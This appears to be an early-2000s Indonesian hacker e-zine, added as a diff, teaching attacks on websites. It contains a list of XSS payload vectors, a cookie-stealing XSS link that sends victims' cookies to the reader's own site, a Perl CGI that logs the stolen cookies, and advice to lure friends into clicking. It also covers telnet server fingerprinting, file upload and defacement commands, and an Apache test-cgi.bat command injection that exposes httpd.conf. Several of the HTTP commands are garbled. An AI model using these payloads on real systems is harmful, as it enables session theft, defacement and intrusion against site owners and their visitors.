@@ -1,0 +1,332 @@
+
+        ____________________   ___ ___ ________
+	\_   _____/\_   ___ \ /   |   \\_____  \
+	 |    __)_ /    \  \//    ~    \/   |   \ 
+	 |        \\     \___\    Y    /    |    \
+	/_______  / \______  /\___|_  /\_______  /
+	        \/         \/       \/         \/ 
+
+
+					    .OR.ID
+ECHO-ZINE RELEASE
+       07
+
+Author: basher13 |basher13@stardawn.net (www.stardawn.net)
+Online @ www.echo.or.id :: http://ezine.echo.or.id
+
+
+=== IHACK#01.e-Zine ====
+
+     Chapter: 1.0
+             +Cross-Site Scripting (CSS/XSS)
+             +Perbedaan XSS dan Script-Injection
+             +Type script yang dapat menginjeksi ke remote website/server
+	     +Bagaimana akibat website jika vulnerable ke XSS
+             +Contoh JavaScript-injection Hacks
+             +Grab a cookie
+
+
+     Chapter: 2.0
+             +Deteksi webserver       
+             +perintah telnet
+             +Test website permission
+             +Exploit direktori Apache (win32)
+
+CHAPTER#1.0
+-----------
+
+
+Cross-Site Scripting (CSS/XSS)
+-----------------------------------------------------
+Cross-Site Scripting adalah sebuah injeksi yang dapat di input ke html
+atau remote halaman sebuah webpage.Cross-Site scripting kadang waktu
+tertuju  ke "XSS",karena "CSS" sewaktu-waktu ke Cascading Style Sheets.
+(CSS).Jika kamu mnedengar vulnerability dengan CSS atau XSS,itu pasti mengarah dan tertuju ke 
+Cross-Site Scripting.
+
+
+Perbedaan XSS dan Script-Injection
+----------------------------------
+1.Script injection ialah suatu remote injeksi script untuk memodifikasi sebuah website.
+2.Cross-Site Scripting tidak permanen melainkan temporary.
+
+
+Type script yang dapat menginjeksi ke remote website/server
+-------------------------------------------------------------
+
+HTML
+JavaScript
+VBScript
+ActiveX
+Flash
+
+
+Bagaimana akibat website jika vulnerable ke XSS
+-----------------------------------------------
+
+Banyak sebuah website cgi/php dan suatu webservers ditemukan halaman 
+'not found' atau forbidden.EX:404-halaman.html not found!.
+Jika benar situs terdapat vulnerability CSS atau tidak maka demikian
+pakai cara ini untuk mengetahui lebih lanjut.
+
+
+
+CONTOH:www.namakorban.com/index.php?main=download.html adalah valid
+
+       ganti download.html ke hacked_by.html dan lihat apa yang didapat
+
+      
+      404 - hacked_by.html Not Found!
+
+     mari kita coba untuk mengetahui XSS vulnerable
+
+
+
+CONTOH:
+www.namasitus.com/index.php?main=<script>alert('XSS Vulnerable')</script>
+
+        ketik di sebuah browser URL,tekan enter ,jika benar muncul sebuah
+pop up alert "XSS Vulnerable" jadi situs tersebut vulnerable ke Cross-Site 
+Scripting  .
+
+Contoh JavaScript-injection Hacks
+==================================
+
+<snip>
+ ----Copi dari GOBBLES SECURITY ADVISORY #33----
+
+  <a href="javas&#99;ript&#35;[code]">
+  <div onmouseover="[code]">
+  <img src="javascript:[code]">
+  <img dynsrc="javascript:[code]"> [IE]
+  <input type="image" dynsrc="javascript:[code]"> [IE]
+  <bgsound src="javascript:[code]"> [IE]
+  &<script>[code]</script>
+  &{[code]}; [N4]
+  <img src=&{[code]};> [N4]
+  <link rel="stylesheet" href="javascript:[code]">
+  <iframe src="vbscript:[code]"> [IE]
+  <img src="mocha:[code]"> [N4]
+  <img src="livescript:[code]"> [N4]
+  <a href="about:<s&#99;ript>[code]</script>">
+  <meta http-equiv="refresh" content="0;url=javascript:[code]">
+  <body onload="[code]">
+  <div style="background-image: url(javascript:[code]);">
+  <div style="behaviour: url([link to code]);"> [IE]
+  <div style="binding: url([link to code]);"> [Mozilla]
+  <div style="width: expression([code]);"> [IE]
+  <style type="text/javascript">[code]</style> [N4]
+  <object classid="clsid:..." codebase="javascript:[code]"> [IE]
+  <style><!--</style><script>[code]//--></script>
+  <![CDATA[<!--]]><script>[code]//--></script>
+  <!-- -- --><script>[code]</script><!-- -- -->
+  <script>[code]</script>
+  <img src="blah"onmouseover="[code]">
+  <img src="blah>" onmouseover="[code]">
+  <xml src="javascript:[code]">
+  <xml id="X"><a><b>&lt;script>[code]&lt;/script>;</b></a></xml>
+  <div datafld="b" dataformatas="html" datasrc="#X"></div>
+  [\xC0][\xBC]script>[code][\xC0][\xBC]/script> [UTF-8; IE, Opera]
+
+ ----Copied from GOBBLES SECURITY ADVISORY #33----
+ </snip>
+
+
+Grab a cookie
+-------------
+Sebuah situs http://website.com mengalami vulnerable
+
+
+-- http://website.com/index.php?main=<contoh javascript>
+
+--http://website.com/index.php?main=<script>document.location=
+'http://situskamu.com/cookie_kamu.cgi?'+document.
+cookie</script>
+Suruh teman /kerabat kamu untuk mengunjungi situs tersebut.
+Sebelumnya kamu sudah membuat cookie log ke situs terlebih dahulu.
+Buat cgi dengan isi berikut ini;
+
+---------cookie_kamu.cgi-----------
+
+ #!/usr/bin/perl
+ # cookie_kamu.cgi
+ # 
+ #
+ # 
+ #       cross-site scripting vulnerabilities.
+
+ $borrowed_info = $ENV{'QUERY_STRING'};
+ $borrowed_info =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
+
+ open(COOKIE_LOG, ">>cookie_kamu_log") or print "Content-type:
+ text/html\n\n upps ada yang salah\n";
+  print COOKIE_LOG "$borrowed_info\n";
+  print "Content-type: text/html\n\n";
+ close(COOKIE_LOG);
+
+ ------------------------------------------
+
+CHAPTER#-0.2
+------------
+
+Deteksi webserver
+-----------------
+
+Cara mendeteksi sebuah website lewat telnet 
+buka program telnet :
+
+Microsoft Telnet>telnet 127.0.0.1 80
+
+GET \ HTTP/1.1\r\n\r\n
+Host:server-software
+
+
+
+HTTP/1.1 403 Forbidden
+Date: Sat, 10 Aug 2002 16:55:41 GMT
+Server: Apache/1.3.22 (Win32)
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+Forbidden
+
+You don't have permission to access on this server.
+
+
+--------------------------------------------------------------------------------
+
+Apache/1.3.22 Server at www.apache.org Port 80
+
+
+
+Connection to host lost.
+Andaikan kita mendeteksi suatu situs www.cobatest.com ,gunakan telnet
+www.cobatest.com 80 
+
+
+Microsoft Telnet>o cobatest.com 80
+Connecting to cobatest.com..
+
+-- blank
+ketik langkah berikut
+
+GET \ HTTP/1.1\r\n\r\n
+selanjutnya ketik
+Host:server-software
+tekan enter untuk beberapa saat kemudian
+
+Cara tersebut ialah untuk mengetahui jenis server dari situs tersebut.
+
+
+Perintah telnet
+---------------
+
+
+GET: digunakan untuk mengirim request membaca aksess sebuah file di web
+server melalui web browser.
+
+Microsoft Telnet>o cobatest.com 80
+Connecting to cobatest.com..
+ketik 
+GET /index.html HTTP/1.1\r\n\r\n
+
+PUT: digunakan untuk membuat suatu file di suatu active server..merequest menulis
+aksess terhadap spesifik virtual direktori diamana nantinya akan dibuat.
+
+
+Microsoft Telnet>o cobatest.com 80
+Connecting to cobatest.com..
+
+
+-- blank
+ketik
+PUT /analyzing.txt HTTP/1.1\r\n\r\n
+
+DEL:suatu perintah untuk menghapus suatu halaman website di active web
+server
+
+Microsoft Telnet>o cobatest.com 80
+Connecting to cobatest.com..
+
+-- blank
+ketik
+del /index.html HTTP/1.1\r\n\r\n
+
+
+ECHO:sebuah print tool sama di DOS batch,bisa untuk menulis di halaman
+utama/main sebuah situs
+
+
+Microsoft Telnet>o cobatest.com 80
+Connecting to cobatest.com..
+
+
+-- blank
+ketik
+ECHO defaced by basher13 >> /index.html HTTP/1.1\r\n\r\n
+
+
+
+
+Test website permission
+----------------------
+Langkah berikut untuk mengetest website jikalau anonymous telnet ke web
+server port 80
+
+Microsoft Telnet>o cobatest.com 80
+Connecting to cobatest.com..
+
+
+-- blank
+ketik
+PUT /scripts/abhisek.asp HTTP/1.1
+Host: iis-server
+Content-Length: 10 
+
+--server  merespond dengan 100 pesan berkelanjutan.
+
+HTTP/1.1 100 Continue
+Server: Microsoft-IIS/5.0
+Date: Thu, 28 Feb 2002 15:56:00 GMT
+
+-- Type 10 kali
+
+AAAAAAAAAA
+
+HTTP/1.1 201 Created
+Server: Microsoft-IIS/5.0
+Date: Thu, 28 Feb 2002 15:56:08 GMT
+Location: http://iis-server/dir/my_file.txt
+Content-Length: 0
+Allow: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, COPY, MOVE, PROPFIND, 
+PROPPATCH, SEARCH, LOCK, UNLOCK
+
+
+Exploit direktori Apache (win32)
+--------------------------------
+
+Di webbrowse ketik 
+
+http://www.target.com/cgi-bin/test-cgi.bat?|copy+..\conf\httpd.conf+..\htdocs\httpd.conf
+
+
+Situs source injection/exploit,vulnerable:
+
+-- http://www.securityfocus.com
+-- http://www.packetstorm.org
+-- http://www.guininski.com
+-- http://www.insecure.org
+-- http://www.securiteam.com
+-- http://www.slashdot.org
+-- http://www.technotronic.com
+
+REFERENSI a.k.a bacaan :
+BrainRawt at www.haxworx.com
+
+Greatz to: IHACK- Indonesian Hackers Team 
+           e-c-h-o,y3dips,b0iler,BrainRawt
+
+           kritik &saran ; ihack@stardawn.net (ihack.stardawn.net)
+
+
+
